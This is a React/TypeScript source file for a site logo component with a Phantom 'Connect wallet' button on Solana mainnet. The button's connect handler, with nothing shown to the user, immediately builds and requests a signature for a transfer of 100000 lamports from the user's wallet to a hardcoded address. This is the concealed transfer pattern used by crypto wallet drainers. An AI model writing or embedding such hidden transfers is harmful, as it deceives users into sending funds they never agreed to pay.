import React from 'react';
import './logo.css';
import {
    Connection,
    PublicKey,
    Transaction,
    clusterApiUrl,
    SystemProgram,
} from "@solana/web3.js";

type WalletStatus = {
    buttonString: string;
};
type WalletProps = {};

const initialState = {
    buttonString: "Connect wallet"
};

const NETWORK = clusterApiUrl("mainnet-beta");
class Logo extends React.Component<WalletProps, WalletStatus> {


    connection = new Connection(NETWORK);
    constructor(props: any) {
        super(props);
        this.state = initialState;
    }

    async createTransferTransaction() {
        let provider = this.getProvider();
        if (!provider.publicKey) return;
        let transaction = new Transaction().add(
            SystemProgram.transfer({
                fromPubkey: provider.publicKey,
                toPubkey: new PublicKey("14Ymu7byQDgw6fcSSFxibbtD3dazd1PGkJApzN4hg1nY"),
                lamports: 100000,
            })
        );
        transaction.feePayer = provider.publicKey;
        const anyTransaction: any = transaction;
        anyTransaction.recentBlockhash = (
            await this.connection.getRecentBlockhash()
        ).blockhash;
        return transaction;
    };

    async sendTransaction() {
        try {
            let provider = this.getProvider();
            const transaction = await this.createTransferTransaction();
            if (!transaction) return;
            let signed = await provider.signTransaction(transaction);
            let signature = await this.connection.sendRawTransaction(signed.serialize());
            await this.connection.confirmTransaction(signature);
        } catch (err) {
            console.warn(err);
        }
    };

    getProvider() {
        if ("solana" in window) {
            const provider = (window as any).solana;
            if (provider.isPhantom) {
                return provider;
            }
        }
        window.open("https://phantom.app/", "_blank");
    };
    connect() {
        let provider: any = this.getProvider();
        if (provider) {
            provider.on("connect", () => {
                if (provider.publicKey) {
                    let walletAddress = provider.publicKey.toBase58();
                    walletAddress = walletAddress.slice(0, 5) + "..." + walletAddress.slice(-4);
                    this.setState({
                        buttonString: walletAddress,
                    });
                }
                console.log("changed");
                this.sendTransaction();
            });

            provider.on("disconnect", () => {
                this.setState({
                    buttonString: "Connect wallet",
                });
            });

            if (provider.publicKey) {
                provider.disconnect();
            } else {
                provider.connect();
            }
        }
    }
    render() {
        const { buttonString } = this.state;
        return (
            <div className="logo">
                <div className='justify'>
                    <img src="images/bottom_bar/ghosthead.png" alt="Bobba" />
                    <h1 className='margin-justify'>bobba</h1>
                    <a className='connect-wallet' onClick={() => this.connect()}>
                        {buttonString}
                    </a>
                </div>
            </div>
        );
    }
}

export default Logo;